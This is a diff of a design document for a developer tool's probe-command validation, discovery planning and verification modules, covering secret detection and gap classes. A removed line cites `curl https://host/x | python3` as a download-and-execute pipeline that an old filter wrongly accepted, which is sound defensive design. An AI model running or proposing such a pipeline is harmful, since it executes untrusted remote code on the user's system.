@@ -48,105 +48,57 @@ authorise its own probe leader — the restriction would certify itself. The shi
 stays the sole source of leader allowlists.
 
 **Probe validation lives in `lib/tool-cache.mjs`, and is not `isRunnable`.**
-`isProbeRunnable(command, {leaders})` and `isPermittedProbeLeader(name)` are the gate.
-`isRunnable` is the wrong tool in both directions — it accepts
-`curl https://host/x | python3` (its filter allowlist includes `python3`, `awk`, `sed`)
-and refuses `docker ps`, `aws ecs list-clusters`, `nomad status` and `pm2 ls`. Probe rules:
-one command, no pipeline, no operators, no redirects, no mutation, and a leader present in
-both the global catalog and the row's own fingerprints. Placeholders are brace-form
-`{field}` — an unquoted `<` reads as a file redirect and is rejected.
 
-Pass the raw template at schema time, and pass the **interpolated** string again immediately
-before execution: a resolved scope value can carry a redirect- or flag-shaped token the
-template never had.
-
-## Discovery
-
-`lib/discovery.mjs` — pure. The environment is passed in, never sensed: no `child_process`,
-no `fs`, no `Date.now()`. That is what makes the engine replayable from a fixture.
+## Interview planning — `lib/discovery.mjs`
 
 ```
-discover({table, env, connectorSkills}) → {discovered, questions, custom, violations}
-    env: {executables[], mcpServers[], repoFiles[]}   collected by the caller
-    discovered[]: {capability, via, evidence, resolvedScope, unresolvedFields, tag}
-                  — exactly the array buildManifest() consumes
-    questions[]:  {capability, field, consumer, mandatory}   scope the interview still owes
-    custom[]:     present tools no row fingerprints (R8) — routed into the declared-gap list
+planInterview({table, env, assigned, connectorSkills})
+    → {routes, relevant, questions, unassigned, violations}
+    `assigned` is YOUR judgement: {capability: {via, kind, why}}. It beats the
+    table's seedHints unconditionally, which is the whole point — a hint list only
+    knows the vendors someone wrote down, and the customer's stack usually is not
+    one of them.
+    `relevant` = the repo shows evidence for it but this machine cannot reach it.
+    Its questions are STILL asked: a teammate who can reach it inherits the answer.
+    `unassigned` = a tool present that nothing claimed. You judge whether it matters.
 
-preFillFromConnectorSkills(table, connectorSkills) → {scopeByCapability, violations}
-interpolate(template, scope, {leaders})            → {ok, command} | {ok:false, reason}
-fillPlaceholders(template, scope)                 → {text, missing}
-    substitution WITHOUT the runnability verdict — for an MCP tool name, which is not
-    a shell command and would be refused by the probe gate on principle.
-matchRow(row, env)                                → {via, evidence} | null
-    the single answer to "does this env satisfy this row". verify.mjs imports it, so
-    detection and verification cannot disagree about the same machine.
+matchHint(row, env) → {via, kind, name} | null
+    Convenience for the common cases. Never authoritative. A `file` kind is
+    relevance, not a route — a directory in the tree cannot prove machine access.
+
+preFillFromConnectorSkills(table, skills) → {scopeByCapability, violations}
+    Fills only fields the table DECLARES, so a connector cannot invent scope
+    nothing downstream reads.
 ```
 
-**There is no probe executor here.** Discovery is fingerprint MATCHING; nothing is run.
-Live reads belong to verification, so the probe-result replay seam lives there. This
-module's fixtures (`tests/fixtures/discovery/*.json`) are environment descriptors.
+## Verification policy — `lib/verify.mjs`
 
-**`interpolate` re-validates.** The template was checked at schema time against `{repo}`,
-not against the string that runs. A resolved scope value can carry a redirect, an operator,
-or a metacharacter the template never had, so the interpolated command goes through
-`isProbeRunnable` again immediately before execution. Checking only the template is the gap
-this closes.
-
-**An always-asked capability is never resolved by discovery**, even on a coincidental
-fingerprint hit — `other` is the catch-all, and matching it by accident would swallow the
-unrecognised stack it exists to surface.
-
-**Connector-skill pre-fill is a less-trusted input, not a more-trusted one.** It reads four
-filesystem paths including a home directory, so any scope probe it declares passes the same
-gate as a shipped table probe, and it may only fill scope fields the table already declares.
-
-## Verification
-
-`lib/verify.mjs` — pure. Probes are dispatched through an injected `runProbe`, because only
-the agent can invoke an MCP tool: verify never calls one, it receives the result through the
-same shape a CLI probe returns.
+It validates what you report. It never probes, never builds a command, and never
+decides how to reach anything.
 
 ```
-verifyGithub({row, scope, env, runProbe, prList, candidates, envVar})
-    → {verified, blocking, via, targets[], accessLevel, warnings[], message?, nextAction?}
-    GitHub is BINARY. `gh` or a GitHub MCP server, or blocking:true and setup stops.
+validateVerification({capability, row, result}) → {result, violations}
+    you report: {verified, via, targets:[{field, value, ok, checkedBy, gap?}], scopes?}
+    A target `ok` with no `checkedBy` is normalised to UNVERIFIED. A claim with no
+    named check carries no information, so it is not accepted as one — this is why
+    a capability probe can no longer "verify" a scope value it never read.
+    A failing target needs gap.class ∈ GAP_CLASS and a non-empty gap.nextAction.
+    Raw provider output and credential-shaped strings are refused outright: the
+    artifact is committed, so a leak there is permanent.
 
-verifyCapability({capability, row, targets, scope, runProbe, envVar, env, candidates})
-    → {capability, verified, via, targets[], accessLevel, warnings[]}
-    Per-TARGET: valid for one repo and 404 on another keeps the capability usable.
+githubGate(validated) → {blocking, message?, nextAction?}
+    GitHub is binary. Without the code and the merged PRs there is no culprit PR,
+    which is the run's entire output.
 
-looksLikeSecret(value)            → {secret, kind?, rotationGuidance?}   never echoes the value
-scrubFailure(raw)                 → error class; the raw text is DROPPED, not redacted-and-kept
-nearMatch(value, candidates)      → closest candidate, or null rather than a wrong guess
-classifyGap({errorClass, env, row}) → one of GAP_CLASS
+looksLikeSecret(value) → {secret, kind?, rotationGuidance?}
+    Never echoes what it refuses. The entropy fallback applies to whitespace-free
+    values only — applied to prose it flagged this library's own warning text.
 prWindowWarning({mergedCount, windowDays, branch}) → warning | null
-replayProbe(results)              → runProbe seam, keyed by command or `mcp:<tool>`
-PR_WINDOW_DAYS                    30 — fixed, build-independent
-MANDATORY_CAPABILITY              "github" — named once, not hard-coded in three places
-ACCESS_LEVEL                      REPORTED | NOT_REPORTABLE
-GAP_CLASS                         ABSENT_ON_MACHINE | SCOPE_INVALID | CREDENTIAL_UNDER_SCOPED
+overBroadWarning(capability, scopes) → warning | null    GitHub scopes only
+GAP_CLASS  absent-on-this-machine · scope-invalid-for-team · credential-under-scoped
+ACCESS_LEVEL  reported · not-reportable    UNVERIFIED    PR_WINDOW_DAYS  30
+MANDATORY_CAPABILITY  "github"
 ```
-
-**`redact` is not the secret detector, and this matters.** Its patterns need a key prefix
-(`token=`) or an auth scheme (`Bearer `), and it returns redacted *text* rather than a verdict —
-so a bare pasted PAT comes back byte-identical and any check built on `redact(v) !== v` reports
-"clean" for exactly the input that matters most. `looksLikeSecret` covers bare provider shapes
-plus a high-entropy fallback that deliberately does **not** flag a 40-character lowercase-hex
-git SHA. Use `redact` for reducing provider output; use `looksLikeSecret` for a verdict.
-
-**Three gap classes, because the three need opposite responses.** A missing tool wants a local
-install instruction; invalid team scope wants a targeted re-ask; a present-but-under-scoped
-credential wants neither — re-asking team scope invites one person to rewrite it to fit their
-own credential, and an install instruction names a tool they already have.
-
-**`NOT_REPORTABLE` is a real access-level state**, not a fallback. `gh` via keyring or device
-flow returns no scope header at all, and calling that "narrow" or "broad" would both be
-inventions.
-
-**On the MCP route the caller supplies `prList`.** There is no command string for a
-branch PR list over MCP, so the agent runs it and passes the merged count — it is the
-base-branch evidence on that route, not an optional extra.
 
 ## Context artifact
 
